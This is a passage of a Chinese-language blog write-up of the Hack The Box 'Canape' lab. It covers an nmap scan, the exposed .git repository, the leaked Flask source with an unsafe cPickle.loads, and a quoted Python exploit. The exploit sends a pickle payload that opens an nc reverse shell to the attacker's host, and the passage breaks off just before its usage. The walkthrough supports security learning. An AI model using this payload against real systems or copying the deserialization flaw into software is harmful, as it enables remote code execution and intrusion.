@@ -1,0 +1,761 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Hack The Box -Canape 123456789101112131415161718192021222324# Nmap 7.92 scan initiated Sun Apr 10 17:29:11 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.70Nmap scan report for 10.10.10.70Hos">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Canape">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Canape/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Hack The Box -Canape 123456789101112131415161718192021222324# Nmap 7.92 scan initiated Sun Apr 10 17:29:11 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.70Nmap scan report for 10.10.10.70Hos">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220410174434181.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220410174606840.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220410174656217.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220410174925675.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220410175322853.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220410214012368.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.885Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:29.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220410174434181.png">
+  
+  
+  
+  <title>HackTheBox-Canape - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Canape"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          133 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Canape</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Hack The Box -Canape</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># Nmap 7.92 scan initiated Sun Apr 10 17:29:11 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.70</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.70</span><br>Host is up (<span class="hljs-number">0.20</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp    <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|<span class="hljs-title">_http-title</span>: Simpsons Fan Site<br>| <span class="hljs-keyword">http</span>-git: <br>|   <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.70</span>:<span class="hljs-number">80</span>/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this <span class="hljs-built_in">file</span> <span class="hljs-string">&#x27;description&#x27;</span> <span class="hljs-built_in">to</span> name <span class="hljs-keyword">the</span>...<br>|     Last commit message: final <span class="hljs-comment"># Please enter the commit message for your changes. Li...</span><br>|     Remotes:<br>|_      <span class="hljs-keyword">http</span>://git.canape.htb/simpsons.git<br>|<span class="hljs-title">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br><span class="hljs-number">65535</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> <span class="hljs-number">8</span>d:<span class="hljs-number">82</span>:<span class="hljs-number">0</span>b:<span class="hljs-number">31</span>:<span class="hljs-number">90</span>:e4:c8:<span class="hljs-number">85</span>:b2:<span class="hljs-number">53</span>:<span class="hljs-number">8</span>b:a1:<span class="hljs-number">7</span>c:<span class="hljs-number">3</span>b:<span class="hljs-number">65</span>:e1 (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">22</span>:fc:<span class="hljs-number">6</span>e:c3:<span class="hljs-number">55</span>:<span class="hljs-number">00</span>:<span class="hljs-number">85</span>:<span class="hljs-number">0</span>f:<span class="hljs-number">24</span>:bf:f5:<span class="hljs-number">79</span>:<span class="hljs-number">6</span>c:<span class="hljs-number">92</span>:<span class="hljs-number">8</span>b:<span class="hljs-number">68</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">0</span>d:<span class="hljs-number">91</span>:<span class="hljs-number">27</span>:<span class="hljs-number">51</span>:<span class="hljs-number">80</span>:<span class="hljs-number">5</span>e:<span class="hljs-number">2</span>b:a3:<span class="hljs-number">81</span>:<span class="hljs-number">0</span>d:e9:d8:<span class="hljs-number">5</span>c:<span class="hljs-number">9</span>b:<span class="hljs-number">77</span>:<span class="hljs-number">35</span> (ED25519)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Apr 10 17:32:41 2022 -- 1 IP address (1 host up) scanned in 209.89 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>SSH版本存在用户名枚举漏洞，暂不考虑先放一边，80端口的Apache也没什么现成漏洞利用，可以访问80端口看看：</p>
+<img src="https://www.worldisend.com/img/image-20220410174434181.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220410174434181" style="zoom:200%;" />
+
+<p>页面有6个按钮其实只有两个，Simpsons Fan Site 以及Home都是原地TP，View Quotes与Character Quotes是同一个页面：</p>
+<img src="https://www.worldisend.com/img/image-20220410174606840.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220410174606840" style="zoom:200%;" />
+
+<p>一堆聊天信息，我拥有了几个潜藏的用户名。Submit Quote都是一个页面：</p>
+<img src="https://www.worldisend.com/img/image-20220410174656217.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220410174656217" style="zoom:200%;" />
+
+<p>我可以试着输入一些东西：</p>
+<img src="https://www.worldisend.com/img/image-20220410174925675.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220410174925675" style="zoom:200%;" />
+
+<p>以post方式提交到了当前页面，抱歉我还是没能看出目标后台运行的什么脚本语言环境，我记得nmap为我扫出过一个.git目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Simpsons Fan Site<br>| http-git: <br>|   10.10.10.70:80/.git/<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220410175322853.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220410175322853" style="zoom:200%;" />
+
+<p>在config中有另一个域名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[core]<br>	repositoryformatversion = 0<br>	filemode = <span class="hljs-literal">true</span><br>	bare = <span class="hljs-literal">false</span><br>	logallrefupdates = <span class="hljs-literal">true</span><br>[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>	url = http://git.canape.htb/simpsons.git<br>	fetch = +refs/heads/*:refs/remotes/origin/*<br>[branch <span class="hljs-string">&quot;master&quot;</span>]<br>	remote = origin<br>	merge = refs/heads/master<br></code></pre></td></tr></table></figure>
+
+<p>可以把其添加到hosts文件中尝试访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.70 git.canape.htb<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220410214012368.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220410214012368" style="zoom:200%;" />
+
+<p>一片空白。要不试着git clone 一下config中的url：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> http://git.canape.htb/simpsons.git<br>正克隆到 <span class="hljs-string">&#x27;simpsons&#x27;</span>...<br>remote: Counting objects: 49, <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (47/47), <span class="hljs-keyword">done</span>.<br>remote: Total 49 (delta 18), reused 0 (delta 0)<br>展开对象中: 100% (49/49), 163.16 KiB | 97.00 KiB/s, 完成.<br></code></pre></td></tr></table></figure>
+
+<p>这便是克隆之后的目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ls</span><br>__init__.py  static  templates<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python">cat __init__.py <br><span class="hljs-keyword">import</span> couchdb<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> cPickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>app = Flask(__name__)<br>app.config.update(<br>    DATABASE = <span class="hljs-string">&quot;simpsons&quot;</span><br>)<br>db = couchdb.Server(<span class="hljs-string">&quot;http://localhost:5984/&quot;</span>)[app.config[<span class="hljs-string">&quot;DATABASE&quot;</span>]]<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">if</span> random.randrange(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(random.randrange(<span class="hljs-number">50</span>, <span class="hljs-number">250</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/quotes&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quotes</span>():<br>    quotes = []<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> db:<br>        quotes.append(&#123;<span class="hljs-string">&quot;title&quot;</span>: db[<span class="hljs-built_in">id</span>][<span class="hljs-string">&quot;character&quot;</span>], <span class="hljs-string">&quot;text&quot;</span>: db[<span class="hljs-built_in">id</span>][<span class="hljs-string">&quot;quote&quot;</span>]&#125;)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;quotes.html&#x27;</span>, entries=quotes)<br><br>WHITELIST = [<br>    <span class="hljs-string">&quot;homer&quot;</span>,<br>    <span class="hljs-string">&quot;marge&quot;</span>,<br>    <span class="hljs-string">&quot;bart&quot;</span>,<br>    <span class="hljs-string">&quot;lisa&quot;</span>,<br>    <span class="hljs-string">&quot;maggie&quot;</span>,<br>    <span class="hljs-string">&quot;moe&quot;</span>,<br>    <span class="hljs-string">&quot;carl&quot;</span>,<br>    <span class="hljs-string">&quot;krusty&quot;</span><br>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/submit&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    error = <span class="hljs-literal">None</span><br>    success = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            char = request.form[<span class="hljs-string">&quot;character&quot;</span>]<br>            quote = request.form[<span class="hljs-string">&quot;quote&quot;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> char <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> quote:<br>                error = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(c.lower() <span class="hljs-keyword">in</span> char.lower() <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> WHITELIST):<br>                error = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># TODO - Pickle into dictionary instead, `check` is ready</span><br>                p_id = md5(char + quote).hexdigest()<br>                outfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/&quot;</span> + p_id + <span class="hljs-string">&quot;.p&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>                outfile.write(char + quote)<br>                outfile.close()<br>                success = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>            error = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;submit.html&quot;</span>, error=error, success=success)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/check&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    path = <span class="hljs-string">&quot;/tmp/&quot;</span> + request.form[<span class="hljs-string">&quot;id&quot;</span>] + <span class="hljs-string">&quot;.p&quot;</span><br>    data = <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;p1&quot;</span> <span class="hljs-keyword">in</span> data:<br>        item = cPickle.loads(data)<br>    <span class="hljs-keyword">else</span>:<br>        item = data<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Still reviewing: &quot;</span> + item<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure>
+
+<p>可以看到目标数据库是couchdb，运行在目标5984，对内不对外。主要是末尾的 item = cPickle.loads(data)，它可能会存在一些不安全的反序列化。靠着这条线索，我又找到了以下脚本，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">这是脚本开发者的个人博客https://0xdf.gitlab.io/，<br><br>这是原文地址：https://0xdf.gitlab.io/2018/09/15/htb-canape.html<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> cPickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, cmd</span>):<br>        self.cmd = cmd<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;echo moe &amp;&amp; &#x27;</span> + self.cmd,))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125; [ip] [port]&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        sys.exit()<br><br>    ip = sys.argv[<span class="hljs-number">1</span>]<br>    port = sys.argv[<span class="hljs-number">2</span>]<br>    cmd = <span class="hljs-string">&quot;rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2&gt;&amp;1 | nc &#123;&#125; &#123;&#125; &gt; /tmp/0xdf&quot;</span>.<span class="hljs-built_in">format</span>(ip, port)<br>    exploit = cPickle.dumps(Exploit(cmd))<br><br>    char = exploit[:-<span class="hljs-number">1</span>]<br>    quote = exploit[-<span class="hljs-number">1</span>:]<br>    id_ = md5(char+quote).hexdigest()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Filename will be: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(id_))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Exploit:\n&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(exploit))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Sending exploit...&quot;</span>)<br>    r = requests.post(<span class="hljs-string">&#x27;http://10.10.10.70/submit&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;character&#x27;</span>: char, <span class="hljs-string">&#x27;quote&#x27;</span>: quote&#125;)<br>    <span class="hljs-keyword">if</span> r.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error submitting exploit to /submit&quot;</span>)<br>        sys.exit()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit successfully submitted&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Triggering exploit with /check, id = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(id_))<br>    <span class="hljs-keyword">try</span>:<br>        r = requests.post(<span class="hljs-string">&#x27;http://10.10.10.70/check&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: id_&#125;, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p>用法也很简单：</p>
